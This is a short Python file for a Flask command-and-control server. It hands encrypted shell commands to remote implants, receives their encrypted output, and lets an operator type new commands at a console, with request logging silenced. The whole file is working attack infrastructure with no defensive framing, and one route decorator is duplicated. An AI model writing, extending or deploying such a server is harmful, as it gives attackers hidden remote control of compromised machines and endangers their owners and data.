from flask import Flask, request
from cryptography.fernet import Fernet
import threading
import time
import logging

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

with open("key.vault", "rb") as f:
    cipher = Fernet(f.read())

current_cmd = "whoami"

@app.route('/get_command', methods=['GET'])
def send_cmd():
    return cipher.encrypt(current_cmd.encode())

@app.route('/post_result', methods=['POST'])
@app.route('/post_result', methods=['POST'])
def receive_res():
    enc_data = request.form.get('result')
    decrypted = cipher.decrypt(enc_data.encode()).decode()
    print("\n" + "="*30)
    print(f"[*] DATA RECEIVED AT {time.strftime('%H:%M:%S')}")
    print("-" * 30)
    print(decrypted)
    print("="*30)
    print("\nEnter command: ", end="")
    return "OK"

def cli():
    global current_cmd
    while True:
        val = input("Enter command: ")
        if val: current_cmd = val
threading.Thread(target=cli, daemon=True).start()

if __name__ == "__main__":
    app.run(port=5000)